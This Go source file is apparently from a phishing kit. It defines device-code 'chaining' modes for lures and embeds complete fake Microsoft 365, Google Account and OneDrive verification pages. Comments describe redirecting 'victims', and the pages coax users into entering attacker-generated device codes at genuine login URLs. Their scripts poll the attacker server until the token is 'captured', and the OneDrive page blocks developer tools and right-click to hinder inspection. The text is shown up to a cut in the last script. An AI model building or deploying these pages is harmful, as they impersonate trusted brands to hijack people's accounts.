package core

// Device Code chaining modes for lures
const (
	DCModeOff      = "off"      // No device code chaining
	DCModeAlways   = "always"   // Always redirect to device code after AitM success (default - survives password changes)
	DCModeFallback = "fallback" // Only use device code if AitM session stalls/fails
	DCModeAuto     = "auto"     // Pre-generate on lure click, auto-select strategy based on outcome
	DCModeDirect   = "direct"   // Skip AitM entirely, show device code interstitial immediately
)

// ValidDeviceCodeModes lists all valid modes
var ValidDeviceCodeModes = []string{DCModeOff, DCModeAlways, DCModeFallback, DCModeAuto, DCModeDirect}

// IsValidDeviceCodeMode checks if a mode string is valid
func IsValidDeviceCodeMode(mode string) bool {
	for _, m := range ValidDeviceCodeModes {
		if m == mode {
			return true
		}
	}
	return false
}

// DEVICE_CODE_INTERSTITIAL_HTML is the Microsoft-styled interstitial page
// served at /dc/{session_id} to redirect victims to microsoft.com/devicelogin
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}
const DEVICE_CODE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="referrer" content="no-referrer">
<title>Microsoft 365 - Secure Access</title>
<link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A8FMh//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyH/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A8FMg//BTIP/wUyD/8FMg//9zMv//czL//3My//9zMv///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8AALv///C7///wu////Lv//wC7////u///8Lv///C7////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wAAu////Lv///C7///wu///ALv///+7///wu////Lv/////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A//8AAP//AADgBwAA4AcAAOAHAADgBwAA//8AAOAHAADgBwAA4AcAAOAHAAD//wAA//8AAP//AAD//wAA//8AAA==">
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;width:100%}
body{font-family:'Segoe UI','Segoe UI Web (West European)',-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f4f8;display:flex;flex-direction:column;min-height:100vh}
.header{background:#0078d4;padding:12px 32px;display:flex;align-items:center;gap:12px;flex-shrink:0}
.header svg{flex-shrink:0}
.header-title{color:#fff;font-size:18px;font-weight:600}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
.card{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,0.08);width:100%;max-width:440px;padding:40px 48px}
.logo{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px}
.logo svg{flex-shrink:0}
.logo-text{font-size:20px;font-weight:600;color:#1a1a1a}
.intro{text-align:center;color:#323130;font-size:15px;line-height:1.6;margin-bottom:24px}
.info-box{background:#deecf9;border-left:4px solid #0078d4;padding:14px 16px;margin-bottom:24px;font-size:14px;color:#004578;line-height:1.5}
.code-label{font-size:13px;font-weight:600;color:#323130;margin-bottom:8px}
.code-input{width:100%;background:#f3f2f1;border:1px solid #8a8886;border-radius:2px;padding:12px 16px;font-size:24px;font-weight:700;letter-spacing:4px;color:#0078d4;text-align:center;font-family:'Segoe UI Mono',Consolas,monospace;margin-bottom:8px;user-select:all}
.code-input.loading{color:#8a8886;font-size:16px;letter-spacing:normal}
.copy-row{display:flex;justify-content:center;margin-bottom:20px}
.copy-btn{background:#0078d4;color:#fff;border:none;padding:8px 20px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600;display:flex;align-items:center;gap:8px;transition:background 0.15s}
.copy-btn:hover{background:#106ebe}
.copy-btn.copied{background:#107c10}
.copy-btn svg{width:16px;height:16px;fill:currentColor}
.status{font-size:13px;color:#107c10;text-align:center;margin-bottom:16px;min-height:20px;font-weight:500}
.btn-primary{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;background:#0078d4;color:#fff;border:none;padding:14px 24px;font-size:15px;font-weight:600;cursor:pointer;border-radius:2px;transition:background 0.15s;margin-bottom:20px}
.btn-primary:hover{background:#106ebe}
.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed}
.btn-primary svg{flex-shrink:0}
.security-box{background:#f3f2f1;border-left:4px solid #0078d4;padding:16px;margin-bottom:20px;text-align:center}
.security-box p{font-size:13px;color:#605e5c;line-height:1.5;margin-bottom:12px}
.security-badge{display:inline-flex;align-items:center;gap:6px;background:#0078d4;color:#fff;padding:8px 16px;border-radius:2px;font-size:13px;font-weight:600}
.security-badge svg{width:14px;height:14px;fill:currentColor}
.footer-text{text-align:center;font-size:12px;color:#605e5c;margin-bottom:16px}
.timer{text-align:center;font-size:12px;color:#8a8886}
.timer span{font-weight:600;color:#323130}
.success{display:none;text-align:center;padding:20px 0}
.success-icon{width:64px;height:64px;background:#107c10;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
.success-icon svg{width:32px;height:32px;fill:#fff}
.success h2{font-size:20px;font-weight:600;color:#323130;margin-bottom:8px}
.success p{font-size:14px;color:#605e5c;margin-bottom:20px}
.success-badge{display:inline-flex;align-items:center;gap:8px;background:#dff6dd;color:#107c10;padding:10px 20px;border-radius:2px;font-size:14px;font-weight:600}
.success-badge svg{width:18px;height:18px;fill:currentColor}
@media(max-width:500px){.card{padding:32px 24px;border-radius:0}.code-input{font-size:20px;letter-spacing:2px}}
</style>
</head>
<body>
<div class="header">
<svg width="24" height="24" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity="0.8"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity="0.9"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity="0.7"/></svg>
<span class="header-title">Microsoft 365</span>
</div>

<div class="main">
<div class="card">
<div class="logo">
<svg width="28" height="28" viewBox="0 0 24 24"><rect width="11" height="11" fill="#f25022"/><rect x="13" width="11" height="11" fill="#7fba00"/><rect y="13" width="11" height="11" fill="#00a4ef"/><rect x="13" y="13" width="11" height="11" fill="#ffb900"/></svg>
<span class="logo-text">Microsoft 365</span>
</div>

<div id="mainView">
<p class="intro">Please verify your identity to securely access your Microsoft 365 account.</p>

<div class="info-box">For security reasons, Microsoft requires verification before granting access to your account resources.</div>

<div class="code-label">Verification Code</div>
<div class="code-input" id="userCode">Loading...</div>

<div class="copy-row">
<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
<span id="copyText">Copy Code</span>
</button>
</div>

<div class="status" id="codeStatus"></div>

<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
<svg width="20" height="20" viewBox="0 0 24 24"><rect width="11" height="11" fill="#fff"/><rect x="13" width="11" height="11" fill="#fff" fill-opacity=".8"/><rect y="13" width="11" height="11" fill="#fff" fill-opacity=".9"/><rect x="13" y="13" width="11" height="11" fill="#fff" fill-opacity=".7"/></svg>
Sign In to Microsoft
</button>

<div class="security-box">
<p>Your account is protected by Microsoft's enterprise-grade security. We use industry-leading encryption to safeguard your information.</p>
<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
Microsoft Secure Platform
</a>
</div>

<p class="footer-text">If you need assistance, contact your Microsoft 365 administrator.</p>

<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
</div>

<div class="success" id="successView">
<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2>Verification Complete</h2>
<p>Your identity has been confirmed. You may now close this window.</p>
<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Account Verified</div>
</div>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var verifyUrl='{verify_url}';
var codeReady={code_ready};
var code='{user_code}';
var expiresIn={expires_seconds};
var popup=null;
var codeEl=document.getElementById('userCode');
var statusEl=document.getElementById('codeStatus');
var btnEl=document.getElementById('signInBtn');
var copyBtnEl=document.getElementById('copyBtn');
var copyTextEl=document.getElementById('copyText');
var timerEl=document.getElementById('timerValue');

function showCode(c,v){
code=c;
if(v)verifyUrl=v;
codeEl.textContent=c;
codeEl.classList.remove('loading');
btnEl.disabled=false;
copyBtnEl.disabled=false;
document.getElementById('verifyLink').href=verifyUrl;
}

if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}

function copyCode(){
if(!code)return;
if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}
else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}
}
function showCopied(){
copyBtnEl.classList.add('copied');
copyTextEl.textContent='Copied!';
statusEl.textContent='Code copied to clipboard';
setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);
}
window.copyCode=copyCode;

function openSignIn(){
if(!code)return;
copyCode();
var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;
popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
if(popup)popup.focus();
}
window.openSignIn=openSignIn;

function updateTimer(){
if(expiresIn<=0)return;
expiresIn--;
var m=Math.floor(expiresIn/60);
var s=expiresIn%60;
timerEl.textContent=m+':'+(s<10?'0':'')+s;
if(expiresIn>0)setTimeout(updateTimer,1000);
}
if(codeReady)setTimeout(updateTimer,1000);

function poll(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'}).then(function(r){return r.json()}).then(function(d){
if(d.ready&&!codeReady){
codeReady=true;
showCode(d.user_code,d.verify_url);
setTimeout(updateTimer,1000);
}
if(d.captured){
if(popup&&!popup.closed)popup.close();
document.getElementById('mainView').style.display='none';
document.getElementById('successView').style.display='block';
}else if(d.failed){
statusEl.textContent='Session expired. Please refresh to try again.';
statusEl.style.color='#d83b01';
codeEl.textContent='—';
}else if(!d.expired){setTimeout(poll,codeReady?3000:600);}
}).catch(function(){setTimeout(poll,3000);});
}
setTimeout(poll,codeReady?3000:400);
})();
</script>
</body>
</html>`

// DEVICE_CODE_POLL_STATUS_JS is injected to poll for device code status
// Used when we need to redirect during an existing AitM session
const DEVICE_CODE_POLL_STATUS_JS = `
(function(){
var sid='{session_id}';
function checkDC(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured && d.redirect_url){
top.location.href=d.redirect_url;
}else if(!d.expired){
setTimeout(checkDC,3000);
}
})
.catch(function(){setTimeout(checkDC,5000);});
}
setTimeout(checkDC,3000);
})();
`

// DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML is the Google-styled interstitial page
// served at /dc/{session_id} for Google Workspace / Gmail device code phishing
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}, {expires_seconds}
const DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="referrer" content="no-referrer">
<title>Google Account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans','Roboto','Segoe UI',Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#202124}
.container{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%;text-align:center}
.logo{margin-bottom:16px}
.title{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124}
.subtitle{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:20px}
.steps{text-align:left;margin:0 0 24px;padding:0 0 0 24px}
.steps li{font-size:14px;color:#202124;margin-bottom:12px;line-height:20px}
.steps li a{color:#1a73e8;text-decoration:none;font-weight:500}
.steps li a:hover{text-decoration:underline}
.code-container{background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px 24px;margin:0 auto 24px;display:inline-block;min-width:200px}
.code{font-size:28px;font-weight:500;letter-spacing:4px;color:#1a73e8;font-family:'Google Sans',monospace}
.btn-row{display:flex;gap:8px;justify-content:center;margin-bottom:16px}
.btn{display:inline-flex;align-items:center;justify-content:center;padding:8px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;border:none;transition:background .2s,box-shadow .2s;font-family:'Google Sans','Roboto',sans-serif}
.btn-primary{background:#1a73e8;color:#fff}
.btn-primary:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
.btn-secondary{background:#fff;color:#1a73e8;border:1px solid #dadce0}
.btn-secondary:hover{background:#f8f9fa}
.timer{font-size:12px;color:#80868b;margin-top:8px}
.copied{color:#137333;font-size:13px;margin-top:4px;min-height:20px}
.footer{margin-top:24px;font-size:12px;color:#80868b}
.footer a{color:#1a73e8;text-decoration:none}
.spinner{display:none;margin:16px auto;width:24px;height:24px;border:3px solid #e8eaed;border-top:3px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.complete{display:none;text-align:center;padding:20px}
.complete .check{font-size:48px;color:#137333;margin-bottom:12px}
.complete .msg{font-size:16px;color:#202124}
.status-icon{margin:20px 0 16px;font-size:40px}
</style>
</head>
<body>
<div class="container" id="main">
<div class="logo">
<svg viewBox="0 0 272 92" width="90" height="30" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.86 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/><path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#EA4335" d="M35.29 41.19V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49-.01z"/></svg>
</div>

<div id="verifyView">
<div class="status-icon" id="statusIcon">&#128274;</div>
<div class="title" id="titleText">Device Verification</div>
<div class="subtitle" id="subtitleText">Complete the sign-in process by verifying your device.</div>

<ol class="steps">
<li>Go to <a href="{verify_url}" target="_blank" rel="noopener" id="verifyLink">{verify_url}</a></li>
<li>Enter the code shown below</li>
<li>Sign in with your Google account and approve access</li>
</ol>

<div class="code-container">
<div class="code" id="userCode">{user_code}</div>
</div>
<div class="copied" id="copiedMsg">&nbsp;</div>

<div class="btn-row">
<button class="btn btn-primary" onclick="copyCode()">Copy code</button>
<a class="btn btn-secondary" href="{verify_url}" target="_blank" rel="noopener">Open link</a>
</div>

<div class="timer" id="timerText">Code expires in <span id="countdown">{expires_minutes}:00</span></div>
<div class="spinner" id="spinner"></div>
</div>

<div class="complete" id="completeView">
<div class="check">&#10004;</div>
<div class="msg">Verification complete. Redirecting...</div>
</div>

<div class="footer">
<a href="https://support.google.com">Help</a> &middot;
<a href="https://policies.google.com/privacy">Privacy</a> &middot;
<a href="https://policies.google.com/terms">Terms</a>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var expMs={expires_seconds}*1000;
var startTime=Date.now();

var tpl='{template_type}';
if(tpl==='fallback'){
document.getElementById('statusIcon').innerHTML='&#9888;&#65039;';
document.getElementById('titleText').textContent='Verification method unavailable';
document.getElementById('subtitleText').textContent='Your security key could not be verified. Use an alternative method to complete sign-in.';
}else if(tpl==='compliance'){
document.getElementById('statusIcon').innerHTML='&#128187;';
document.getElementById('titleText').textContent='Device enrollment required';
document.getElementById('subtitleText').textContent='Your organization requires device registration to access this service.';
}else{
document.getElementById('statusIcon').innerHTML='&#9989;';
document.getElementById('titleText').textContent='Sign-in verified';
document.getElementById('subtitleText').textContent='One more step: Link this device to your account for continued access.';
}

function copyCode(){
var code=document.getElementById('userCode').textContent;
if(navigator.clipboard){
navigator.clipboard.writeText(code).then(function(){
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
});
}else{
var ta=document.createElement('textarea');
ta.value=code;
document.body.appendChild(ta);
ta.select();
document.execCommand('copy');
document.body.removeChild(ta);
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
}
}
window.copyCode=copyCode;

function updateTimer(){
var elapsed=Date.now()-startTime;
var remaining=Math.max(0,expMs-elapsed);
if(remaining<=0){
document.getElementById('countdown').textContent='EXPIRED';
return;
}
var m=Math.floor(remaining/60000);
var s=Math.floor((remaining%60000)/1000);
document.getElementById('countdown').textContent=m+':'+(s<10?'0':'')+s;
setTimeout(updateTimer,1000);
}
updateTimer();

function checkStatus(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured){
document.getElementById('verifyView').style.display='none';
document.getElementById('completeView').style.display='block';
setTimeout(function(){
if(d.redirect_url){
top.location.href=d.redirect_url;
}
},1500);
}else if(d.expired){
document.getElementById('countdown').textContent='EXPIRED';
}else{
document.getElementById('spinner').style.display='block';
setTimeout(checkStatus,3000);
}
})
.catch(function(){
setTimeout(checkStatus,5000);
});
}
setTimeout(checkStatus,5000);
})();
</script>
</body>
</html>`

// OneDrive document access themed page
const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="referrer" content="no-referrer">
<title>OneDrive - Secure Access</title>
<link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAA8pJREFUWEfNl1tsFFUYx+fs7M7OdrtbWiiFUqBAoRRKS4sX1BgTjYkaY4wPxgcfTHwwMRofTEw0PviAD8YHE0x8MDE+GKMxahRFjYoKKihC5VIutFDaLbS95bJtd3Znduabn2dmm253Z7u0xJN8mZ2Z/Z/z+853vjOzFv8H">
<style>*{margin:0;padding:0;box-sizing:border-box}body,html{height:100%;width:100%}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#e8f0f6;display:flex;flex-direction:column;min-height:100vh}.header{background:#0078d4;padding:14px 32px;display:flex;align-items:center;gap:12px;flex-shrink:0;box-shadow:0 2px 4px rgba(0,0,0,0.1)}.header svg{flex-shrink:0}.header-title{color:#fff;font-size:15px;font-weight:600}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:50px 20px}.card{background:#fff;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,0.12);width:100%;max-width:480px;padding:48px 44px}.logo{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:32px}.logo svg{flex-shrink:0}.logo-text{font-size:17px;font-weight:700;color:#0078d4}.intro{text-align:center;color:#323130;font-size:13px;line-height:1.6;margin-bottom:28px;font-weight:500}.info-box{background:#d4ebfc;border-left:4px solid:#0078d4;padding:16px 18px;margin-bottom:28px;font-size:14px;color:#004578;line-height:1.6}.code-label{font-size:14px;font-weight:700;color:#323130;margin-bottom:10px;text-transform:uppercase;letter-spacing:0.5px}.code-input{width:100%;background:#f8fafb;border:2px solid#0078d4;border-radius:6px;padding:14px;font-size:20px;font-weight:800;letter-spacing:5px;color:#0078d4;text-align:center;font-family:'Courier New',Consolas,monospace;margin-bottom:12px;user-select:all;transition:border-color .2s}.code-input.loading{color:#8a8886;font-size:17px;letter-spacing:normal;border-color:#c8c6c4}.copy-row{display:flex;justify-content:center;margin-bottom:24px}.copy-btn{background:#0078d4;color:#fff;border:none;padding:10px 24px;border-radius:6px;cursor:pointer;font-size:15px;font-weight:700;display:flex;align-items:center;gap:10px;transition:background .2s,transform .1s}.copy-btn:hover{background:#005a9e;transform:translateY(-1px)}.copy-btn.copied{background:#107c10}.copy-btn svg{width:18px;height:18px;fill:currentColor}.status{font-size:14px;color:#107c10;text-align:center;margin-bottom:20px;min-height:22px;font-weight:600}.btn-primary{display:flex;align-items:center;justify-content:center;gap:12px;width:100%;background:#0078d4;color:#fff;border:none;padding:14px 24px;font-size:14px;font-weight:700;cursor:pointer;border-radius:6px;transition:background .2s,transform .1s;margin-bottom:24px}.btn-primary:hover{background:#005a9e;transform:translateY(-1px)}.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed;transform:none}.btn-primary svg{flex-shrink:0}.security-box{background:#f3f8fc;border:1px solid#b3d6f0;border-radius:6px;padding:18px;margin-bottom:24px;text-align:center}.security-box p{font-size:13px;color:#323130;line-height:1.6;margin-bottom:14px}.security-badge{display:inline-flex;align-items:center;gap:8px;background:#0078d4;color:#fff;padding:10px 20px;border-radius:6px;font-size:14px;font-weight:700;text-decoration:none;transition:background .2s}.security-badge:hover{background:#005a9e}.security-badge svg{width:16px;height:16px;fill:currentColor}.footer-text{text-align:center;font-size:13px;color:#605e5c;margin-bottom:18px}.timer{text-align:center;font-size:13px;color:#8a8886;font-weight:500}.timer span{font-weight:700;color:#d83b01}.success{display:none;text-align:center;padding:24px 0}.success-icon{width:72px;height:72px;background:linear-gradient(135deg,#107c10,#0b5a0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 4px 12px rgba(16,124,16,0.3)}.success-icon svg{width:36px;height:36px;fill:#fff}.success h2{font-size:22px;font-weight:700;color:#323130;margin-bottom:10px}.success p{font-size:15px;color:#605e5c;margin-bottom:24px}.success-badge{display:inline-flex;align-items:center;gap:10px;background:#dff6dd;color:#107c10;padding:12px 24px;border-radius:6px;font-size:15px;font-weight:700;border:1px solid#b3e0b0}.success-badge svg{width:20px;height:20px;fill:currentColor}@media(max-width:500px){.card{padding:36px 28px;border-radius:0}.code-input{font-size:22px;letter-spacing:3px}}</style>
</head>
<body>
<div class="header">
<svg width="21" height="21" viewBox="0 0 23 23"><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
<span class="header-title">OneDrive</span>
</div>
<div class="main"><div class="card">
<div class="logo">
<img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/OneDrive-Icon-FY26.svg" width="40" height="40" alt="OneDrive" style="flex-shrink:0">
<span class="logo-text">OneDrive</span>
</div>
<div id="mainView">
<p class="intro">A secure access code has been generated for your shared document.</p>
<div class="info-box">For security reasons, OneDrive requires verification before granting access to shared documents. Use the code below to complete authentication.</div>
<div class="code-label">Document Access Code</div>
<div class="code-input" id="userCode">Loading...</div>
<div class="copy-row">
<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
<span id="copyText">Copy Code</span>
</button>
</div>
<div class="status" id="codeStatus"></div>
<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
<svg width="20" height="20" viewBox="0 0 24 24"><path fill="#fff" d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/></svg>
Access Document
</button>
<div class="security-box">
<p>Your document is protected by OneDrive's enterprise-grade security. We use industry-leading encryption to safeguard your information.</p>
<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
OneDrive Secure Platform
</a>
</div>
<p class="footer-text">If you need assistance, contact your OneDrive administrator.</p>
<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
</div>
<div class="success" id="successView">
<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2>Verification Complete</h2>
<p>Your identity has been confirmed. You may now close this window.</p>
<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>Document Access Granted</div>
</div>
</div></div>
<script>
document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});
